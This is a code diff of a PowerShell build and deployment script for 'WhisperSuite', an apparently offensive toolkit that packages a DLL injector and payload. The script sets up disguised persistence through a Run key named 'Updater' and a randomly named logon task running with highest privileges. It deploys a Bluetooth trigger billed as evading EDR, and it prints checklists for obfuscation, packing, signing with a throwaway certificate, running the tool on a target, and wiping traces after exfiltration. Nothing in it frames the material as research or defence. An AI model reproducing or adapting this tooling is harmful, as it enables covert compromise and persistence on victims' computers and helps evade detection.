@@ -1,8 +1,11 @@
 # BuildDeployWhisper.ps1
-# Master build + deployment script for the Whisper Suite
-# Includes compilation, polymorphism, persistence, BLE trigger, and hybrid worm logic
+# Master build + deployment script for WhisperSuite: GhostWhisper Edition
+# Includes compilation, polymorphism, persistence, BLE trigger, wormhole, and virtualization
 
 $baseDir = "$PSScriptRoot"
+$finalPackage = "$baseDir\WhisperSuite_Build"
+
+# === Core Binaries ===
 $ghostKeyDLL = "$baseDir\GhostKey\bin\Release\GhostKey.dll"
 $injectorEXE = "$baseDir\WraithTap\x64\Release\WraithTap.exe"
 $dropperEXE = "$baseDir\Dropper_with_Raven.exe"
@@ -10,7 +13,23 @@ $cleanerPS1 = "$baseDir\SilentBloom.ps1"
 $bleTriggerScript = "$baseDir\BLETrigger.ps1"
 $polymorphScript = "$baseDir\GhostPolymorph.ps1"
 $bleConnectScript = "$baseDir\GhostBLEConnect_v2.ps1"
-$finalPackage = "$baseDir\WhisperSuite_Build"
+$bootstrapScript = "$baseDir\GhostWhisperBootstrap.ps1"
+
+# === Modules ===
+$modulePaths = @(
+    "Modules\GhostLogger.ps1",
+    "Modules\AnomalyHunter.ps1",
+    "Modules\Anomaly_Detector.ps1",
+    "Modules\Wormhole.ps1",
+    "Modules\LinuxPDF_Emu.ps1",
+    "Modules\LinuxPDF_Runtime.ps1",
+    "Modules\Phase_Anoint.ps1",
+    "Modules\Phase_Bind.ps1",
+    "Modules\Phase_Cleanse.ps1",
+    "Modules\GhostResidency.ps1",
+    "Modules\GhostSeal.ps1",
+    "Modules\ExorcistMode.ps1"
+)
 
 function Compile-Projects {
     Write-Host "[*] Compiling C# GhostKey DLL..."
@@ -26,16 +45,29 @@ function Embed-RavenPoem {
 }
 
 function Prepare-Package {
-    Write-Host "[*] Packaging final Whisper Suite..."
+    Write-Host "[*] Packaging WhisperSuite build..."
     New-Item -ItemType Directory -Path $finalPackage -Force | Out-Null
+    New-Item -ItemType Directory -Path "$finalPackage\Modules" -Force | Out-Null
 
+    # Core components
     Copy-Item $injectorEXE "$finalPackage\WraithTap.exe" -Force
     Copy-Item $ghostKeyDLL "$finalPackage\GhostKey.dll" -Force
     Copy-Item $cleanerPS1 "$finalPackage\SilentBloom.ps1" -Force
     Copy-Item $bleTriggerScript "$finalPackage\BLETrigger.ps1" -Force
     Copy-Item $polymorphScript "$finalPackage\GhostPolymorph.ps1" -Force
     Copy-Item $bleConnectScript "$finalPackage\GhostBLEConnect_v2.ps1" -Force
+    Copy-Item $bootstrapScript "$finalPackage\GhostWhisperBootstrap.ps1" -Force
 
+    # Modules
+    foreach ($mod in $modulePaths) {
+        if (Test-Path "$baseDir\$mod") {
+            Copy-Item "$baseDir\$mod" "$finalPackage\$mod" -Force
+        } else {
+            Write-Warning "[!] Missing module: $mod"
+        }
+    }
+
+    # Tribute note
     $note = @"
 This toolkit is a ghost in motion.
 It exists for those who are unseen.
@@ -44,11 +76,12 @@ And for one who is gone, but not forgotten.
 —R
 "@
     Set-Content -Path "$finalPackage\note.txt" -Value $note
-    Write-Host "[✓] Whisper Suite ready in: $finalPackage"
+
+    Write-Host "[✓] WhisperSuite is ready: $finalPackage"
 }
 
 function Setup-Persistence {
-    Write-Host "[*] Creating registry and scheduled task persistence entries..."
+    Write-Host "[*] Creating registry and scheduled task persistence..."
 
     $payloadPath = "C:\\Windows\\System32\\GhostKey.dll"
     $injectorPath = "C:\\Windows\\System32\\WraithTap.exe"
@@ -58,43 +91,42 @@ function Setup-Persistence {
         Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value $execCommand -Force
         Write-Host "[+] Registry persistence set (HKCU Run key)."
     } catch {
-        Write-Host "[-] Failed to create registry persistence: $_"
+        Write-Warning "[-] Failed to create registry key: $_"
     }
 
     try {
         $taskName = "WinSvc_" + -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
         schtasks /create /tn $taskName /tr "\"$injectorPath\" \"$payloadPath\"" /sc onlogon /rl highest /f | Out-Null
-        Write-Host "[+] Scheduled task persistence created ($taskName)."
+        Write-Host "[+] Scheduled task created ($taskName)."
     } catch {
-        Write-Host "[-] Failed to create scheduled task persistence."
+        Write-Warning "[-] Failed to create scheduled task: $_"
     }
 }
 
 function Deploy-BLETrigger {
-    Write-Host "[*] Creating BLE-based trigger script with encrypted handshake, EDR evasion, and command validation..."
+    Write-Host "[*] Creating BLE trigger script with encrypted handshake and EDR evasion..."
     $bleScript = Get-Content "$baseDir\Templates\BLETrigger_Encrypted.ps1" -Raw
     Set-Content -Path $bleTriggerScript -Value $bleScript
-    Write-Host "[+] BLE trigger script created with signature validation and obfuscation."
+    Write-Host "[+] BLE trigger deployed."
 }
 
 function Show-Obfuscation-Checklist {
     Write-Host "`n===== OBFUSCATION CHECKLIST ====="
     Write-Host "[1] Run GhostKey.dll through ConfuserEx or Dotfuscator"
     Write-Host "[2] Strip symbols from WraithTap.exe (/DEBUG:NONE)"
-    Write-Host "[3] Use UPX (optional) for lightweight packer"
-    Write-Host "[4] Change filenames or recompile with randomized strings"
-    Write-Host "[5] Use sdelete or cipher /w to wipe build artifacts"
-    Write-Host "[6] Optionally sign binaries with throwaway cert for legitimacy"
+    Write-Host "[3] Use UPX or similar packer for WraithTap"
+    Write-Host "[4] Randomize filenames or strings for each deployment"
+    Write-Host "[5] Wipe build artifacts with cipher /w or sdelete"
+    Write-Host "[6] Optionally sign with throwaway certificate"
 }
 
 function Show-Deployment-Flow {
     Write-Host "`n===== DEPLOYMENT FLOW ====="
-    Write-Host "[1] Transfer WhisperSuite_Build to USB or handheld device"
-    Write-Host "[2] On target, run: .\\WraithTap.exe GhostKey.dll OR .\\BLETrigger.ps1"
-    Write-Host "[3] After operation, run: .\\SilentBloom.ps1"
-    Write-Host "[4] Ensure GhostKey.dll self-destructed (or wipe manually)"
-    Write-Host "[5] Use cipher /w or file shredder to remove residuals"
-    Write-Host "[6] If using live USB, format it after exfiltration"
+    Write-Host "[1] Transfer WhisperSuite_Build to secure device (USB, Flipper, etc)"
+    Write-Host "[2] Use GhostWhisperBootstrap.ps1 to engage modules"
+    Write-Host "[3] Trigger via BLETrigger.ps1 or WraithTap.exe GhostKey.dll"
+    Write-Host "[4] Run SilentBloom.ps1 post-op for cleanup"
+    Write-Host "[5] Securely shred or format exfiltration media"
 }
 
 # === EXECUTION ===
